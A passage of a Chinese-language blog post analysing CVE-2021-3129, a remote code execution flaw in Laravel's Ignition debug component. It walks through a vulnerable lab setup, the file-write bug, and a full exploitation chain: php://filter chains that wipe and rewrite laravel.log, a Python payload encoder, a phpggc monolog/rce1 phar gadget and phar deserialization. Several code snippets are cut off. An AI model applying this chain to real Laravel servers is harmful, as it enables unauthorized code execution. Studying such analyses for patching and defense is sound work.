        );
        echo urlencode(serialize($pendingcommand));
    }
    ?>
## CVE-2021-3129 Laravel 远程代码执行漏洞分析
###  环境搭建
    $ git clone https://github.com/laravel/laravel.git    # 下载laravel源码
    $ cd laravel
    $ git checkout e849812    # 切换到存在漏洞的分支
    $ composer install        # 安装依赖
    $ composer require facade/ignition==2.5.1    # 下载安装存在漏洞版本的组件
    $ php artisan serve --host=0.0.0.0   # 启动服务器
或者像我一样，直接下载对应版本的源码
然后步骤和之前的环境搭建类似，生成`vender`目录，再创建`APP_KEY`
> 该版本要求PHP 7.3以上，否则生成`vender`目录时会报错
建议使用docker进行复现，手动搭建挺费劲，在`config`下转成debug模式访问后，环境搭建成功：
可以看到现在比前一个版本的laravel美化了很多，并且支持一键修复等功能，其实也部分收益于`Ignition`，它是Laravel
6+默认错误页面生成器，可以看到它给我们提供了解决方法，让我们在配置文件中给Laravel配置一个APP_KEY
这里我们点击生成KEY看下包：
通过这种方式，`Iginition`成功在配置文件中.env生成了APP_KEY
最终环境也就搭建完成：
###  漏洞分析
出现问题的地方就在于Laravel的这个Iginition插件，我们来看该插件一共提供了几种solutions来供使用:
在`vendor\facade\ignition\src\Solutions`中:
这里贴一个针对没有APP_KEY的solutions的代码:
     'https://laravel.com/docs/master/installation#configuration',
            ];
        }
        public function getSolutionActionDescription(): string
        {
            return 'Generate your application encryption key using `php artisan key:generate`.';
        }
        public function getRunButtonText(): string
        {
            return 'Generate app key';
        }
        public function getSolutionDescription(): string
        {
            return '';
        }
        public function getRunParameters(): array
        {
            return [];
        }
        public function run(array $parameters = [])
        {
            Artisan::call('key:generate');
        }
    }
可以看到实际上当点击按钮调用了该类的run方法从而生成了APP_KEY  
也正是因为其中的`vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php`过滤不严谨才导致了漏洞的产生
我们先到控制器来看一下Laravel是如何调用solutions的:
    getRunnableSolution();
            $solution->run($request->get('parameters', []));
            return response('');
        }
    }
这里首先判断该类是否实现`Facade\IgnitionContracts\RunnableSolution`该接口来判断给类是否属于solutions类（这里就是用solutions类来讲），在判断该类是否实现`RunnableSolution`接口，得到该类后接着调用run方法，并且传递的参数是我们可控的，因此我们的目的是在已知的solutions类里找到一个危险的run方法
我们来看`vendor\facade\ignition\src\Solutions\MakeViewVariableOptionalSolution.php`
    variableName = $variableName;
            $this->viewFile = $viewFile;
        }
        public function run(array $parameters = [])
        {
            $output = $this->makeOptional($parameters);
            if ($output !== false) {
                file_put_contents($parameters['viewFile'], $output);
            }
        }
        public function makeOptional(array $parameters = [])
        {
            $originalContents = file_get_contents($parameters['viewFile']);
            $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);
            $originalTokens = token_get_all(Blade::compileString($originalContents));
            $newTokens = token_get_all(Blade::compileString($newContents));
            $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);
            if ($expectedTokens !== $newTokens) {
                return false;
            }
            return $newContents;
        }
由于篇幅原因，这里截取关键代码，主要看其run方法的实现，这里的逻辑很容易明白，就是将出现错误的变量进行修改后再重新写上去，为了映证该类的实现，我们不妨自己写一个路由来试试错
和之前一样，在`routes\web.php`增加一个路由,并且仿照`welcome.blade.php`写好`resources\views\viewError.blade.php`
    getLocale()) }}">
            Crispr
                {{$user}}
访问该路由，在调试模式下`Ignition`会指出如何修复这个问题，`$user`未被定义，因此修复方法如之前`MakeViewVariableOptionalSolution.php`所指出，将其替换为$user??’’
点击按钮会进行修复，抓个包来看看调用情况:
注意在此也并不完全是能够进行任意文件写，因为:
    public function makeOptional(array $parameters = [])
        {
            $originalContents = file_get_contents($parameters['viewFile']);
            $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);
            $originalTokens = token_get_all(Blade::compileString($originalContents));
            $newTokens = token_get_all(Blade::compileString($newContents));
            $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);
            if ($expectedTokens !== $newTokens) {
                return false;
            }
            return $newContents;
        }
这里设置了一个预期token，并且将其和新的token进行对比，如果相等才会返回，进而进行写入，也就是说如果我们对代码的结构所做的更改没有超出预期，则文件将被其新内容替换，所以在这里能够写入的文件为：
  * 1.view模板定义出错的文件
  * 2.Laravel中的文件（可能写入出错）
  * 3.Laravel日志文件  
因为在debug模式下,Laravel会将报错默认写到`storage\logs\laravel.log`下  
我们不妨尝试利用该接口（暂且称为接口）来先读一个不存在的路径，看调试状态下是否会写入到日志文件：
在日志文件中，进行了三次记录，有一次经过了转义，而有两次次保留原样：
然而在日志文件中是无法得到解析的，需要配合任意文件包含，而在Laravel中并没有出现任意文件包含的利用点，因此在这里利用日志文件来getshell又打住了。
再回到之前，我们现在可控的是`file_get_contents`，并且路径可控，这时候想到还能利用Phar文件，当对phar文件进行file_get_contents，如果该文件是构造好的反序列化的phar，便可以触发反序列化，造成RCE
####  利用思路
原作者在文章中使用的是`php://filter`中`convert.base64-decode`的特性，将Log文件进行清空，再将整个log文件控制为一个phar文件，这样在读取日志文件时就能够触发反序列化，这里复盘一下作者的思路:  
先通过一个小demo来说明:
    utf-16`同样通过demo进行查看:
    utf-16le的转化后，我们的payload可能会存在不可打印字符，这样我们在传输时会起到阻碍，因此我们还需要再嵌套一层过滤器，能够将这种不可见字符转化成可打印的字符，这样在传输过程中会非常正确而方便，PHP不愧是世界上最好的语言，PHP提供了一种`convert.quoted-printable-encode`的过滤器能够打印所有不可见字符。
钥控制log文件为phar文件，应该需要分为两步：
  * 1.将log文件清空
  * 2.写入phar文件
**将Log文件清空**
作者使用
    php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode将log文件进行清空
归结到底就是将所有字符变成非base64字符后使用base64-decode将所有非base64字符清空
为了方便理解，这里我进行分步查看，我们先使用
    php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode/resource=../storage/logs/laravel.log
得到类似这种字符，此时是无法进行base64-decode的，因为=后面出现了base64字符会导致base64decode的出错，因此这里在进行如下操作  
`php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8`对Log文件进行`file_put_contents`:
此时应该很明显，已经没有base64字符了，在进行`convert.base64-decode`就能将所有字符清空，形成空的log文件，到此第一步已经完成
**写入phar文件**
前文提到，当我们尝试读取不存在的文件时，在日志文件中会出现三次：
作者文章中提到，其格式为：  
`[时间] [字符] PAYLOAD [原因+字符] PAYLOAD [字符] 部分PAYLOAD [字符]`  
完整的payload会出现在前两次，而后一次是不完整的，因此我们必须要使得至少一次完整的payload被file_get_contents,作者使用`convert.iconv.utf-16le.utf-8`将utf-16转化为utf-8
由于会写入两次完整的payload，我们只需要在后面那个payload加入一个字符：
这样一来就只有一次PAYLOAD,除了PAYLOAD是base64字符外其他都是非base64字符，因此只要我们将PAYLOAD进行base64编码后再decode即可把非base64字符消除掉。
注意在这里使用`echo
-ne`进行写入，而当在file_get_contents()传入\00的时候php会报错，触发Debug页面的报错，这样一来写入的payload就会被污染，所以要将空字节（\00）写入到log中，作者使用了`convert.quoted-printable-encode`过滤器将不可见字符进行打印，其原理是将字符变成ascii值后在前面加上=好，而`convert.quoted-printable-decode`过滤器则相反，将=号后面字符解码在进行打印，因此我们使用`=00`替代`\00`，这样`file_get_contens`不会出错，并且加上`convert.quoted-printable-decode`又变成\00
我们构造如下脚本用来得到经过printable-encode的base64编码后的utf-16格式的payload,注意此处ascii值一定要为大写，否则某些字符会出现异常:
    # -*- coding=utf-8 -*-    # Author : Crispr
    import base64
    def get_payload_encode(payload):
        payload = payload.encode('utf-8')
        payloadBase = base64.b64encode(payload).decode("utf-8")
        return ''.join(["=" + hex(ord(c))[2:] + "=00" for c in payloadBase])
    print( get_payload_encode("Crispr") )
    #Output: =51=00=33=00=4a=00=70=00=63=00=33=00=42=00=79=00
将其进行写入：
再通过
    php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
这样就清除除了Crispr外所有的其他字符，这样只需要获得phar的数据即可:
最后由于laravel的日志系统使用的是monolog，而且该依赖存在反序列化漏洞能够进行RCE，参考phpggc中的链子monolog-rce1:
    php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0
将其转化为经过`convert.quoted-printable-encode`的utf-16形式后传入，注意在最后加入一个字符使得总有一个完整的PAYLOAD得到保留，最后在清空字符串:
此时我们来看一下记录在log中的值:
可以很明显的知道是一个phar的数据，最后将该日志地址进行传入，通过file_get_contents来触发反序列化,实现RCE
最后附上成功的截图
最后附上参考链接和EXP：
EXP: